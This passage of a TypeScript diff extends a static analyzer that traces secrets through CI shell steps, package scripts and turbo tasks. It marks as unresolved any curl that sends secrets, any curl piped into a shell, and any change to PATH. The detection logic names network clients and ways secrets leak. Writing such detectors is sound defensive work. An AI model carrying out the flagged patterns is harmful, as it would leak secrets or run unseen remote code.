+  let operands = 0;
+  const add = (file: string | undefined) => {
+    if (file !== undefined) paths.push(file);
+    return file !== undefined;
+  };
+  for (let k = 0; k < args.length; k++) {
+    const value = args[k]?.value ?? '';
+    if (!value.startsWith('-') || value === '-') {
+      if (add(findFile(value, scope, io))) operands++;
+      continue;
+    }
+    const [option, inline] = splitOption(value);
+    if (python && option.startsWith('-m')) {
+      // python -m a.b, or -ma.b: the module, from where it runs.
+      const dotted = option === '-m' ? (args[++k]?.value ?? '') : option.slice(2);
+      paths.push(...pythonModule(dotted, scope, io));
+    } else if (inline !== undefined) {
+      add(findFile(inline, scope, io));
+    } else if ((node && NODE_VALUES.has(option)) || (python && PYTHON_VALUES.has(option))) {
+      add(findFile(args[++k]?.value ?? '', scope, io));
+    } else if (!option.startsWith('--') && option.length > 2) {
+      // -fx: a short option's value attached to it, when it names a file.
+      add(findFile(option.slice(2), scope, io));
+    }
+  }
+  if (node && operands === 0 && args.some((w) => w.value === '--test')) {
+    paths.push(...nodeTestFiles(scope.cwd, io));
+  }
+  paths.push(...runnerInputs(name, args, scope, io));
+  return hashed(paths, io);
+}
+
 /** False, and unresolved, past the depth limit. */
 function deepEnough(ctx: Ctx, scope: Scope, src: Source, where: string, command: string): boolean {
   if (scope.depth <= MAX_DEPTH) return true;
-  cannotRead(ctx, src, where, command, `the census stops ${MAX_DEPTH} calls deep`);
+  cannotRead(ctx, scope, src, where, command, `the census stops ${MAX_DEPTH} calls deep`);
   return false;
 }
 
-/** The arguments of a call with a secret make $1, $@ and the rest secrets. */
-function withArguments(scope: Scope, args: Word[]): Scope {
-  if (!args.some((word) => usesSecret(word.raw, scope.secretVars))) return scope;
-  return { ...scope, secretVars: new Set([...scope.secretVars, ...POSITIONAL]) };
+/**
+ * A script or function called with arguments: a secret among them makes $1,
+ * $@ and the rest secrets (what the census cannot see, unseen), and the call
+ * is recorded on everything inside that the census cannot read, with the
+ * files its words name, so a changed call opens it again.
+ */
+function withCall(scope: Scope, call: string, args: Word[], io: Io): Scope {
+  if (args.length === 0) return scope;
+  const secret = args.some((word) => usesSecret(word.raw, scope.secretVars));
+  const hidden = args.some((word) => readsUnseen(word.raw, scope.unseen));
+  return {
+    ...scope,
+    secretVars: secret ? new Set([...scope.secretVars, ...POSITIONAL]) : scope.secretVars,
+    unseen: hidden ? new Set([...scope.unseen, ...POSITIONAL]) : scope.unseen,
+    calls: scope.calls.includes(call) ? scope.calls : [...scope.calls, call],
+    callRuns: { ...scope.callRuns, ...filesRun('', args, scope, io) },
+  };
 }
 
 /** `--name=value` as [name, value], or [word, undefined]. */
@@ -1381,68 +1830,129 @@ function taintGithubFiles(command: Command, secretVars: ReadonlySet<string>, ctx
   return secret && lines.some((line) => /\bGITHUB_(?:ENV|OUTPUT)\b/.test(line));
 }
 
-function walk(script: string, src: Source, scope: Scope, ctx: Ctx): void {
+/** Each script parsed once: a function's body is read again for each call. */
+const PARSED = new Map<string, Command[]>();
+function parsed(script: string): Command[] {
+  let commands = PARSED.get(script);
+  if (commands === undefined) {
+    commands = parseShell(script);
+    PARSED.set(script, commands);
+  }
+  return commands;
+}
+
+/**
+ * Reads a script's commands. `only` reads the body of that function alone,
+ * for a call. `share` is for a script the same shell runs (source, eval, a
+ * trap): what it assigns, the caller sees.
+ */
+function walk(
+  script: string,
+  src: Source,
+  scope: Scope,
+  ctx: Ctx,
+  mode: { only?: string; share?: boolean } = {},
+): void {
   // The shell can call what this script defines from here on, and so can a
   // script that sourced this one: they are the same shell.
-  for (const name of functionNames(script)) scope.shell.functions.set(name, { script, src });
-  const writesGithubFiles = /\bGITHUB_(?:ENV|OUTPUT)\b/.test(script);
-  /** One reading; returns the functions called with a secret, and where. */
-  const pass = (secretVars: Set<string>) => {
-    const called: Array<{ home: FunctionHome; where: string; call: string }> = [];
-    let secretToGithubFile = false;
-    const multiline: string[] = [];
-    for (const command of parseShell(script)) {
-      taint(command.words, secretVars);
-      if (writesGithubFiles) {
-        secretToGithubFile = taintGithubFiles(command, secretVars, ctx) || secretToGithubFile;
-        for (const word of command.words) {
-          const m = /^["']?([A-Za-z_][\w-]*)<</.exec(word.raw);
-          if (m?.[1]) multiline.push(m[1]);
-        }
-      }
-      const where = src.where(command.line);
-      const inner: Scope = { ...scope, secretVars, depth: scope.depth + 1 };
-      for (const nested of command.nested) {
-        const at = src.where(nested.line);
-        if (!deepEnough(ctx, inner, src, at, `$(${nested.script.trim()})`)) continue;
-        walk(nested.script, fixedSource(src.file, at), newShell(inner), ctx);
-      }
-      const words = dispatch(command.words, command, src, where, inner, ctx);
-      const home = scope.shell.functions.get(words?.[0]?.value ?? '');
-      if (home && (words ?? []).slice(1).some((word) => usesSecret(word.raw, secretVars))) {
-        called.push({ home, where, call: text(words ?? []) });
-      }
-    }
-    // NAME<<EOF, then the value written by later commands.
-    if (secretToGithubFile) {
-      for (const name of multiline) {
-        ctx.names.add(name);
-        ctx.written.add(name);
-      }
-    }
-    return called;
-  };
-  const called = pass(new Set(scope.secretVars));
-  // A function was called with a secret: read the script that defines it
-  // again with $1, $@ and the rest as secrets, once for this shell. This
-  // script's own were read that way already when its parameters were secrets.
-  const secretVars = new Set([...scope.secretVars, ...POSITIONAL]);
-  const positionalSecret = POSITIONAL.every((p) => scope.secretVars.has(p));
-  for (let i = 0; i < called.length; i++) {
-    const { home, where, call } = called[i] ?? { home: undefined, where: '', call: '' };
-    if (!home) continue;
-    const own = home.script === script && home.src.file === src.file;
-    const key = `${home.src.where(1)}\n${home.script}`;
-    if ((own && positionalSecret) || scope.shell.reread.has(key)) continue;
-    scope.shell.reread.add(key);
-    if (own) {
-      // Read again, it can pass the secret on to a function from another file.
-      called.push(...pass(secretVars));
-      continue;
-    }
-    const deeper: Scope = { ...scope, secretVars, depth: scope.depth + 1 };
-    if (deepEnough(ctx, deeper, src, where, call)) walk(home.script, home.src, deeper, ctx);
+  if (mode.only === undefined) {
+    for (const name of functionNames(script)) scope.shell.functions.set(name, { script, src });
   }
+  const writesGithubFiles = /\bGITHUB_(?:ENV|OUTPUT)\b/.test(script);
+  const secretVars = mode.share ? scope.secretVars : new Set(scope.secretVars);
+  const unseen = mode.share ? scope.unseen : new Set(scope.unseen);
+  const envSecrets = mode.share ? scope.envSecrets : new Set(scope.envSecrets);
+  let secretToGithubFile = false;
+  const multiline: string[] = [];
+  for (const command of parsed(script)) {
+    if (mode.only !== undefined && !command.fn.includes(mode.only)) continue;
+    for (const name of taint(command.words, secretVars, unseen)) envSecrets.add(name);
+    if (writesGithubFiles) {
+      secretToGithubFile = taintGithubFiles(command, secretVars, ctx) || secretToGithubFile;
+      for (const word of command.words) {
+        const m = /^["']?([A-Za-z_][\w-]*)<</.exec(word.raw);
+        if (m?.[1]) multiline.push(m[1]);
+      }
+    }
+    const where = src.where(command.line);
+    const inner: Scope = { ...scope, secretVars, unseen, envSecrets, depth: scope.depth + 1 };
+    for (const nested of command.nested) {
+      const at = src.where(nested.line);
+      if (!deepEnough(ctx, inner, src, at, `$(${nested.script.trim()})`)) continue;
+      walk(nested.script, fixedSource(src.file, at), newShell(inner), ctx);
+    }
+    lookupChanges(command, src, where, inner, ctx);
+    const words = dispatch(command.words, command, src, where, inner, ctx);
+    const name = words?.[0]?.value ?? '';
+    const home = name.includes('/') ? undefined : scope.shell.functions.get(name);
+    if (home && words) callFunction(name, home, words, src, where, inner, ctx);
+  }
+  // NAME<<EOF, then the value written by later commands.
+  if (secretToGithubFile) {
+    for (const name of multiline) {
+      ctx.names.add(name);
+      ctx.written.add(name);
+    }
+  }
+}
+
+/**
+ * A call of a function the shell knows: its body runs now, with the
+ * variables as they stand here (a global assigned from a secret after the
+ * definition is one by now), its parameters from the call, and the call
+ * recorded on what the census cannot read inside. Each body is read once per
+ * shell for the same variables and call.
+ */
+function callFunction(
+  name: string,
+  home: FunctionHome,
+  words: Word[],
+  src: Source,
+  where: string,
+  scope: Scope,
+  ctx: Ctx,
+): void {
+  const called = withCall(scope, text(words), words.slice(1), ctx.io);
+  const body: Scope = {
+    ...called,
+    secretVars: new Set(called.secretVars),
+    unseen: new Set(called.unseen),
+    envSecrets: new Set(called.envSecrets),
+  };
+  const key = [
+    home.src.where(1),
+    name,
+    [...body.secretVars].sort().join(' '),
+    [...body.unseen].sort().join(' '),
+    [...body.envSecrets].sort().join(' '),
+    ...body.calls,
+  ].join('\n');
+  if (scope.shell.reread.has(key)) return;
+  scope.shell.reread.add(key);
+  if (deepEnough(ctx, body, src, where, text(words))) {
+    walk(home.script, home.src, body, ctx, { only: name });
+  }
+}
+
+/**
+ * Names whose branch reads what the arguments run (a -c script, a
+ * package.json script, a turbo task, find's -exec) or judges the call.
+ */
+const FOLLOWS = new Set([
+  ...['curl', 'curl.exe', 'eval', 'trap', 'find', 'pnpm', 'npm', 'yarn', 'npx', 'bunx', 'turbo'],
+  ...SHELLS,
+]);
+
+/** Whether dispatch has a branch for a program of this name. */
+function hasBranch(name: string, args: Word[]): boolean {
+  return (
+    FOLLOWS.has(name) ||
+    name in WRAPPERS ||
+    isRunner(name, args) ||
+    HTTP_CLIENTS.has(name) ||
+    SERVER_CLIENTS.has(name) ||
+    name === 'gh'
+  );
 }
 
 /** Runs one command's words; returns them unwrapped, or null when unresolved. */
@@ -1454,49 +1964,120 @@ function dispatch(
   scope: Scope,
   ctx: Ctx,
 ): Word[] | null {
-  const words = unwrap(all, (why) => cannotRead(ctx, src, where, text(all), why));
+  const words = unwrap(all, (why) => cannotRead(ctx, scope, src, where, text(all), why));
   const program = words?.[0];
   if (!words || !program) return words;
   const args = words.slice(1);
-  const cannot = (why: string, runs: Record<string, string> = {}) => {
-    cannotRead(ctx, src, where, text(words), why, runs);
+  const call = text(words);
+  if (expansion(program.raw).expands) {
+    // "$@", "$1", "$CMD": what the caller passes, recorded with the call.
+    const runs = filesRun('', args, scope, ctx.io);
+    cannotRead(ctx, scope, src, where, call, 'a program named by an expansion', runs);
     return words;
-  };
-  if (expansion(program.raw).expands) return cannot('a program named by an expansion');
+  }
   const name = program.value.split('/').pop() ?? '';
   if (/\.(?:ba|z|k|da)?sh$/.test(program.value)) {
-    runFile(program, args, src, where, text(words), newShell(scope), ctx);
-  } else if (program.value.includes('/') && !program.value.startsWith('/')) {
+    runFile(program, args, src, where, call, newShell(scope), ctx);
+    return words;
+  }
+  if (program.value.includes('/') && !program.value.startsWith('/')) {
     // The shell never looks a word with a '/' up on PATH: ./scripts/psql and
     // tools/wget are files of the repository, whatever their names.
-    runRepoProgram(program, args, src, where, text(words), newShell(scope), ctx);
-  } else if (name === 'curl' || name === 'curl.exe') {
+    const found = findFile(program.value, scope, ctx.io) !== undefined;
+    if (found) runRepoProgram(program, args, src, where, call, newShell(scope), ctx);
+    // A file named like a program the census follows most likely runs it
+    // (./bin/pnpm, tools/bash, ./bin/sudo): what its arguments run is read
+    // too. One the repository does not hold, an earlier step made
+    // (node_modules/.bin/turbo, .venv/bin/python): it goes by its name.
+    if (name in WRAPPERS) {
+      dispatch([{ raw: program.raw, value: name }, ...args], command, src, where, scope, ctx);
+      return words;
+    }
+    if (FOLLOWS.has(name) || (!found && hasBranch(name, args))) {
+      return byName(name, program, words, command, src, where, scope, ctx);
+    }
+    if (!found) {
+      const runs = filesRun(name, args, scope, ctx.io);
+      cannotRead(ctx, scope, src, where, call, 'no such file in the repository', runs);
+    }
+    return words;
+  }
+  const shadow =
+    program.value.includes('/') || BUILTINS.has(name) || scope.shell.functions.has(name)
+      ? undefined
+      : findFile(program.value, scope, ctx.io);
+  if (shadow !== undefined && shadow !== src.file) {
+    // PATH finds a bare name: a repository file of that name where the step
+    // runs (or at the root) would run instead, were its directory on PATH.
+    // (Inside that file, the same name is the program PATH finds after it.)
+    runRepoProgram(program, args, src, where, call, newShell(scope), ctx);
+  }
+  return byName(name, program, words, command, src, where, scope, ctx);
+}
+
+/** A program by its name: curl is judged, the rest followed or unresolved. */
+function byName(
+  name: string,
+  program: Word,
+  words: Word[],
+  command: Command,
+  src: Source,
+  where: string,
+  scope: Scope,
+  ctx: Ctx,
+): Word[] | null {
+  const args = words.slice(1);
+  const call = text(words);
+  const cannot = (why: string, runs: Record<string, string> = {}) => {
+    cannotRead(ctx, scope, src, where, call, why, runs);
+    return words;
+  };
+  if (name === 'curl' || name === 'curl.exe') {
     const curl = readCurl(args);
-    ctx.out.curls.push({
-      where,
-      command: text(command.words),
-      sendsSecret: sendsSecret(args, curl, scope.secretVars),
-      prints: whyPrinted(curl, command.piped),
-    });
+    const sends = sendsSecret(args, curl, scope.secretVars);
+    const prints = whyPrinted(curl, command.piped);
+    ctx.out.curls.push({ where, command: text(command.words), sendsSecret: sends, prints });
+    // What a command printed, or a file held, may be a secret the census cannot
+    // see; where curl writes (-o "$(mktemp)") is not sent.
+    const hidden = args.filter(
+      (word) => readsUnseen(word.raw, scope.unseen) && !curl.targets.includes(word),
+    );
+    if (!sends && prints.length > 0 && hidden.length > 0) {
+      return cannot(
+        `it sends what a command printed or a file held (${text(hidden)}), which the census cannot see, and keeps its answer: ${prints.join('; ')}`,
+      );
+    }
   } else if (SHELLS.has(name)) {
-    runShell(args, command, src, where, text(words), newShell(scope), ctx);
+    runShell(args, command, src, where, call, newShell(scope), ctx);
   } else if (name === 'source' || name === '.') {
-    // The same shell: what the file defines, the caller can call.
-    if (args[0]) runFile(args[0], args.slice(1), src, where, text(words), scope, ctx);
+    // The same shell: what the file defines and assigns, the caller has.
+    if (args[0]) runFile(args[0], args.slice(1), src, where, call, scope, ctx, true);
   } else if (name === 'eval') {
     if (args.some((word) => expansion(word.raw).expands))
       return cannot('eval of text the census cannot see');
-    if (deepEnough(ctx, scope, src, where, text(words))) {
-      walk(args.map((word) => word.value).join(' '), fixedSource(src.file, where), scope, ctx);
+    if (deepEnough(ctx, scope, src, where, call)) {
+      const script = args.map((word) => word.value).join(' ');
+      walk(script, fixedSource(src.file, where), scope, ctx, { share: true });
     }
   } else if (name === 'trap') {
     const handler = args[0];
     if (!handler || handler.value === '' || /^-[lp]?$/.test(handler.value)) return words;
     if (expansion(handler.raw).expands) return cannot('a trap the census cannot see');
-    if (deepEnough(ctx, scope, src, where, text(words))) {
-      walk(handler.value, fixedSource(src.file, where), scope, ctx);
+    if (deepEnough(ctx, scope, src, where, call)) {
+      walk(handler.value, fixedSource(src.file, where), scope, ctx, { share: true });
     }
   } else if (name === 'find') {
+    // find "$@", find . $ARGS: words that may hold -exec and a command.
+    const hidden = args.some((word) => {
+      const { expands, splits } = expansion(word.raw);
+      return LIST_EXPANSION.test(word.raw) || (expands && splits);
+    });
+    if (hidden) {
+      return cannot(
+        'find with words the census cannot see, which may hold -exec',
+        filesRun('', args, scope, ctx.io),
+      );
+    }
     for (let k = 0; k < args.length; k++) {
       if (!['-exec', '-execdir', '-ok', '-okdir'].includes(args[k]?.value ?? '')) continue;
       let end = k + 1;
@@ -1505,23 +2086,20 @@ function dispatch(
       k = end;
     }
   } else if (name === 'pnpm' || name === 'npm' || name === 'yarn') {
-    runPackageManager(name, args, command, src, where, text(words), scope, ctx);
+    runPackageManager(name, args, command, src, where, call, scope, ctx);
   } else if (name === 'npx' || name === 'bunx') {
-    runPackageBin(name, args, command, src, where, text(words), scope, ctx);
+    runPackageBin(name, args, command, src, where, call, scope, ctx);
   } else if (name === 'turbo') {
-    runTurbo(args, src, where, text(words), scope, ctx);
-  } else if (RUNNER.test(name)) {
-    return cannot(`${name} runs code the census cannot read`, filesRun(name, args, scope, ctx.io));
+    runTurbo(args, src, where, call, scope, ctx);
+  } else if (isRunner(name, args)) {
+    // The program itself is hashed too: a repository file PATH may find for a bare name.
+    const runs = filesRun(name, [program, ...args], scope, ctx.io);
+    return cannot(`${name} runs code the census cannot read`, runs);
   } else if (
     HTTP_CLIENTS.has(name) ||
     SERVER_CLIENTS.has(name) ||
     (name === 'gh' && args[0]?.value === 'api')
   ) {
-    // PATH finds a bare name. A repository file of that name where the step
-    // runs would run instead were its directory on PATH, so it is read too.
-    if (!program.value.includes('/') && findFile(program.value, scope, ctx.io) !== undefined) {
-      runRepoProgram(program, args, src, where, text(words), newShell(scope), ctx);
-    }
     return cannot(
       SERVER_CLIENTS.has(name)
         ? 'a client that prints what a server answers, which the census does not judge'
@@ -1533,6 +2111,79 @@ function dispatch(
     return cannot(`${name} has a curl command among its arguments, which it may run`);
   }
   return words;
+}
+
+/** cp, install, ln and mv: the options whose value is the next word. */
+const COPY_VALUES: Record<string, string[]> = {
+  cp: ['-S', '--suffix', '-t', '--target-directory'],
+  ln: ['-S', '--suffix', '-t', '--target-directory'],
+  mv: ['-S', '--suffix', '-t', '--target-directory'],
+  install: [
+    ...['-m', '--mode', '-o', '--owner', '-g', '--group', '-S', '--suffix'],
+    ...['-t', '--target-directory', '-Z', '--context'],
+  ],
+};
+/** A directory that is, or may be, on PATH: bin, sbin, node_modules/.bin. */
+const BIN_DIRECTORY = /(?:^|\/)(?:s?bin|\.bin)(?:\/|$)/;
+
+/**
+ * What changes the file a bare name runs, or the config file curl reads by
+ * itself, is unresolved: a directory added to PATH for later steps
+ * ($GITHUB_PATH); PATH, HOME, CURL_HOME or XDG_CONFIG_HOME set, here or
+ * through $GITHUB_ENV; a curl config file (.curlrc, curlrc) named; and a
+ * repository file (or one named by an expansion) put into a bin directory.
+ */
+function lookupChanges(command: Command, src: Source, where: string, scope: Scope, ctx: Ctx): void {
+  const call = text(command.words);
+  const cannot = (why: string) => cannotRead(ctx, scope, src, where, call, why);
+  const lines = [
+    ...command.words.map((word) => word.raw),
+    ...command.heredocs.flatMap((body) => body.split('\n')),
+  ];
+  if (lines.some((line) => /\bGITHUB_PATH\b/.test(line))) {
+    cannot('it adds a directory to PATH for the steps after it, where a bare name may run a file');
+  }
+  const set = new Set<string>();
+  for (const word of command.words) {
+    const name = ASSIGNMENT.exec(word.raw)?.[1];
+    if (name && LOOKUP_VARIABLES.has(name)) set.add(name);
+  }
+  if (lines.some((line) => /\bGITHUB_ENV\b/.test(line))) {
+    for (const line of lines) {
+      const name = /^["']?([A-Za-z_]\w*)(?:=|<<)/.exec(line)?.[1];
+      if (name && LOOKUP_VARIABLES.has(name)) set.add(name);
+    }
+  }
+  for (const name of set) cannot(`it sets ${name}, ${LOOKUP_VARIABLES.get(name)}`);
+  if (lines.some((line) => /curlrc/i.test(line))) {
+    cannot('it names a curl config file, which every curl reads by itself unless -q comes first');
+  }
+  const words = unwrap(command.words, () => undefined) ?? [];
+  const values = COPY_VALUES[words[0]?.value.split('/').pop() ?? ''];
+  if (!values) return;
+  const operands: Word[] = [];
+  let target: string | undefined;
+  for (let k = 1; k < words.length; k++) {
+    const arg = words[k]?.value ?? '';
+    const [option, inline] = splitOption(arg);
+    if (REDIRECTION.test(arg)) {
+      if (REDIRECTION_ALONE.test(arg)) k++;
+    } else if (option === '-t' || option === '--target-directory') {
+      target = inline ?? words[++k]?.value;
+    } else if (values.includes(option)) {
+      if (inline === undefined) k++;
+    } else if (!arg.startsWith('-') || arg === '-') {
+      const word = words[k];
+      if (word) operands.push(word);
+    }
+  }
+  const destination = target ?? operands.pop()?.value;
+  const repositoryFile = operands.some(
+    (word) => expansion(word.raw).expands || findFile(word.value, scope, ctx.io) !== undefined,
+  );
+  if (destination !== undefined && BIN_DIRECTORY.test(destination) && repositoryFile) {
+    cannot(`it puts a file into ${destination}, a directory on PATH, where a bare name may run it`);
+  }
 }
 
 /** Programs that print their arguments, which may name curl. */
@@ -1562,10 +2213,11 @@ function runShell(
   for (let k = 0; k < args.length; k++) {
     const arg = args[k]?.value ?? '';
     if (/^-[A-Za-z]*c[A-Za-z]*$/.test(arg)) {
-      // bash -c 'script' name args...
+      // bash -c 'script' name args...: its $0, $1 and on.
       if (deepEnough(ctx, scope, src, where, call)) {
         const inline = args[k + 1]?.value ?? '';
-        walk(inline, fixedSource(src.file, where), withArguments(scope, args.slice(k + 2)), ctx);
+        const called = withCall(scope, call, args.slice(k + 2), ctx.io);
+        walk(inline, fixedSource(src.file, where), called, ctx);
       }
       return;
     }
@@ -1580,7 +2232,7 @@ function runShell(
   // bash <<EOF, or bash -s: the script is the here-document.
   if (command.heredocs.length === 0) {
     // curl ... | bash, or bash < file: a script from standard input.
-    cannotRead(ctx, src, where, call, 'a shell reading its script from standard input');
+    cannotRead(ctx, scope, src, where, call, 'a shell reading its script from standard input');
     return;
   }
   if (!deepEnough(ctx, scope, src, where, call)) return;
@@ -1594,6 +2246,7 @@ function findFile(path: string, scope: Scope, io: Io): string | undefined {
   );
 }
 
+/** A shell script, read with its arguments: `share` when the same shell runs it (source). */
 function runFile(
   path: Word,
   args: Word[],
@@ -1602,19 +2255,24 @@ function runFile(
   call: string,
   scope: Scope,
   ctx: Ctx,
+  share = false,
 ): void {
-  if (expansion(path.raw).expands || path.value.startsWith('/')) {
-    cannotRead(ctx, src, where, call, 'a script the census cannot find');
-    return;
-  }
-  const found = findFile(path.value, scope, ctx.io);
+  const found =
+    expansion(path.raw).expands || path.value.startsWith('/')
+      ? undefined
+      : findFile(path.value, scope, ctx.io);
   if (!found) {
-    cannotRead(ctx, src, where, call, 'no such file in the repository');
+    const why =
+      expansion(path.raw).expands || path.value.startsWith('/')
+        ? 'a script the census cannot find'
+        : 'no such file in the repository';
+    cannotRead(ctx, scope, src, where, call, why, filesRun('', args, scope, ctx.io));
     return;
   }
   if (!deepEnough(ctx, scope, src, where, call)) return;
   noteScript(ctx.out, found);
-  walk(ctx.io.read(found) ?? '', fileSource(found), withArguments(scope, args), ctx);
+  const called = withCall(scope, call, args, ctx.io);
+  walk(ctx.io.read(found) ?? '', fileSource(found), called, ctx, { share });
 }
 
 /** ./x: a shell script by its first line, or a program the census cannot read. */
@@ -1631,15 +2289,23 @@ function runRepoProgram(
   const body = found === undefined ? null : ctx.io.read(found);
   const name = program.value.split('/').pop() ?? '';
   if (found === undefined || body === null) {
-    // .venv/bin/python x.py: a program an earlier step made; x.py is ours.
+    // .venv/bin/mytool x.py: a program an earlier step made; x.py is ours.
     const runs = filesRun(name, args, scope, ctx.io);
-    cannotRead(ctx, src, where, call, 'no such file in the repository', runs);
+    cannotRead(ctx, scope, src, where, call, 'no such file in the repository', runs);
   } else if (/^#!\S*?(?:\/env\s+)?\S*\b(?:ba|z|k|da|mk)?sh\b/.test(body)) {
     runFile(program, args, src, where, call, scope, ctx);
   } else {
     // The program, what it imports, and the files it is given.
     const runs = filesRun(name, [program, ...args], scope, ctx.io);
-    cannotRead(ctx, src, where, call, 'a repository program that is not a shell script', runs);
+    cannotRead(
+      ctx,
+      scope,
+      src,
+      where,
+      call,
+      'a repository program that is not a shell script',
+      runs,
+    );
   }
 }
 
@@ -1769,7 +2435,20 @@ function workspacePackages(io: Io, includeRoot: boolean): string[] {
   return [...(includeRoot ? ['.'] : []), ...[...packages].sort()];
 }
 
-/** Runs a package.json script (with its pre and post scripts) in each directory. */
+/** The package.json files of these directories, each with a hash of its text. */
+function manifests(dirs: string[], io: Io): Record<string, string> {
+  const files = dirs.map((dir) => posix.join(dir, 'package.json'));
+  return hashed(
+    files.filter((file) => io.read(file) !== null),
+    io,
+  );
+}
+
+/**
+ * Runs a package.json script (with its pre and post scripts) in each
+ * directory. The words after its name are added to the script itself, as
+ * npm and pnpm add them (pnpm run deploy -- --target prod).
+ */
 function runScript(
   name: string,
   dirs: string[],
@@ -1779,13 +2458,14 @@ function runScript(
   call: string,
   scope: Scope,
   ctx: Ctx,
+  extra: Word[] = [],
 ): boolean {
   let found = false;
   for (const dir of dirs) {
     const packageJson = posix.join(dir, 'package.json');
     const pkg = ctx.io.read(packageJson);
     if (pkg === null) {
-      if (!fanOut) cannotRead(ctx, src, where, call, `no ${packageJson}`);
+      if (!fanOut) cannotRead(ctx, scope, src, where, call, `no ${packageJson}`);
       continue;
     }
     const scripts = readScripts(pkg);
@@ -1797,7 +2477,10 @@ function runScript(
       if (!deepEnough(ctx, scope, src, where, call)) return found;
       noteScript(ctx.out, file);
       // A package.json script runs in a shell of its own.
-      walk(body, fixedSource(file, file), newShell({ ...scope, cwd: dir }), ctx);
+      const own = hook === name ? extra : [];
+      const script = own.length > 0 ? `${body} ${text(own)}` : body;
+      const shell = withCall(newShell({ ...scope, cwd: dir }), call, own, ctx.io);
+      walk(script, fixedSource(file, file), shell, ctx);
     }
   }
   return found;
@@ -1814,8 +2497,12 @@ function runPackageManager(
   ctx: Ctx,
 ): void {
   const options = MANAGER_OPTIONS[manager] ?? { values: [], flags: [], fanOut: [] };
-  const cannot = (why: string) => cannotRead(ctx, src, where, call, why);
   let cwd = scope.cwd;
+  // What it would run is in package.json: its hash, and every workspace package's.
+  const cannot = (why: string) => {
+    const dirs = [cwd, '.', ...workspacePackages(ctx.io, false)];
+    cannotRead(ctx, scope, src, where, call, why, manifests([...new Set(dirs)], ctx.io));
+  };
   let k = 0;
   for (; k < args.length; k++) {
     const arg = args[k]?.value ?? '';
@@ -1835,7 +2522,13 @@ function runPackageManager(
   const [first, ...rest] = args.slice(k);
   const inScope: Scope = { ...scope, cwd };
   const sub = first?.value ?? 'install';
-  if (fanOut && manager !== 'pnpm') {
+  const run = sub === 'run' || sub === 'run-script';
+  if (first && expansion(first.raw).expands) {
+    // npm "$@", pnpm "$TASK": the command, a script name or a binary, is not in the text.
+    cannot(`a ${manager} command named by an expansion, which the census cannot follow`);
+  } else if (run && rest[0] && expansion(rest[0].raw).expands) {
+    cannot(`a ${manager} script named by an expansion, which the census cannot follow`);
+  } else if (fanOut && manager !== 'pnpm') {
     cannot(`a ${manager} workspace fan-out, which the census does not follow`);
   } else if (sub === 'workspace' || sub === 'workspaces') {
     cannot(`a ${manager} workspace fan-out, which the census does not follow`);
@@ -1849,7 +2542,7 @@ function runPackageManager(
   } else if (!MANAGER_BUILTINS.has(sub)) {
     let script = sub;
     let extra = rest;
-    if (sub === 'run' || sub === 'run-script') {
+    if (run) {
       script = rest[0]?.value ?? '';
       extra = rest.slice(1);
     } else if (manager === 'npm' && !NPM_SCRIPT_COMMANDS.has(sub)) {
@@ -1867,7 +2560,18 @@ function runPackageManager(
         return;
       }
     }
-    const found = runScript(script, dirs, fanOut, src, where, call, inScope, ctx);
+    // The words after the script's name, less a fan-out option read above.
+    const added: Word[] = [];
+    for (let j = extra[0]?.value === '--' ? 1 : 0; j < extra.length; j++) {
+      const word = extra[j];
+      const [option, inline] = splitOption(word?.value ?? '');
+      if (!options.fanOut.includes(option)) {
+        if (word) added.push(word);
+      } else if (inline === undefined && options.values.includes(option)) {
+        j++;
+      }
+    }
+    const found = runScript(script, dirs, fanOut, src, where, call, inScope, ctx, added);
     // pnpm and yarn run a package's binary when no script has the name.
     if (!found && !fanOut && manager !== 'npm') {
       dispatch([{ raw: script, value: script }, ...extra], command, src, where, inScope, ctx);
@@ -1917,7 +2621,16 @@ function runPackageBin(
         ...['-r', '--recursive', '--no-bail', '--report-summary', '--allow-build'],
       ].includes(option)
     ) {
-      cannotRead(ctx, src, where, call, `${runner} ${arg}: an option the census cannot read`);
+      const runs = { ...manifests([scope.cwd], ctx.io), ...filesRun('', args, scope, ctx.io) };
+      cannotRead(
+        ctx,
+        scope,
+        src,
+        where,
+        call,
+        `${runner} ${arg}: an option the census cannot read`,
+        runs,
+      );
       return;
     }
   }
@@ -1931,6 +2644,13 @@ function runPackageBin(
   }
   const first = words[0];
   if (!first) return;
+  if (expansion(first.raw).expands) {
+    // npx "$@", bunx "$TOOL": "$@" is not a package named "$" at a version.
+    const runs = { ...manifests([scope.cwd], ctx.io), ...filesRun('', words, scope, ctx.io) };
+    const why = `${runner} of a package or command named by an expansion, which the census cannot follow`;
+    cannotRead(ctx, scope, src, where, call, why, runs);
+    return;
+  }
   // A package to fetch and run: name@version, @scope/name@version.
   const fetched = !named && /dlx|npx|bunx/.test(runner);
   const program = fetched
@@ -1955,7 +2675,17 @@ function runTurbo(
   scope: Scope,
   ctx: Ctx,
 ): void {
-  const cannot = (why: string) => cannotRead(ctx, src, where, call, why);
+  // What it would run: turbo.json and every package's scripts.
+  const cannot = (why: string) => {
+    const dirs = ['.', ...workspacePackages(ctx.io, false)];
+    const runs = {
+      ...hashed(
+        ['turbo.json'].filter((f) => ctx.io.read(f) !== null),
+        ctx.io,
+      ),
+    };
+    cannotRead(ctx, scope, src, where, call, why, { ...runs, ...manifests(dirs, ctx.io) });
+  };
   const first = args[0]?.value ?? '';
   if (first === 'gen' || first === 'generate') {
     cannot('turbo gen runs generators the census cannot read');
@@ -1979,9 +2709,19 @@ function runTurbo(
     ...['--no-daemon', '--daemon', '--remote-only', '--single-package', '--framework-inference'],
   ];
   const tasks: string[] = [];
+  /** turbo run build -- --flag: the words after -- go to each task's script. */
+  let extra: Word[] = [];
   for (let k = first === 'run' || first === 'watch' ? 1 : 0; k < args.length; k++) {
     const arg = args[k]?.value ?? '';
-    if (arg === '--') break;
+    if (arg === '--') {
+      extra = args.slice(k + 1);
+      break;
+    }
+    if (expansion(args[k]?.raw ?? '').expands) {
+      // turbo run "$TASK", turbo "$@": a task the census cannot name.
+      cannot('a turbo task or option named by an expansion, which the census cannot follow');
+      return;
+    }
     if (arg.startsWith('-')) {
       const [option, inline] = splitOption(arg);
       if (values.includes(option)) {
@@ -2033,9 +2773,10 @@ function runTurbo(
     return;
   }
   for (const task of closure) {
-    // A root task is //#task in turbo.json.
+    // A root task is //#task in turbo.json. The words after -- go to the tasks named.
     const dirs = `//#${task}` in config ? ['.', ...packages] : packages;
-    runScript(task, dirs, true, src, where, call, scope, ctx);
+    const own = tasks.includes(task) ? extra : [];
+    runScript(task, dirs, true, src, where, call, scope, ctx, own);
   }
 }
 
@@ -2385,17 +3126,20 @@ function actionsPassedSecrets(
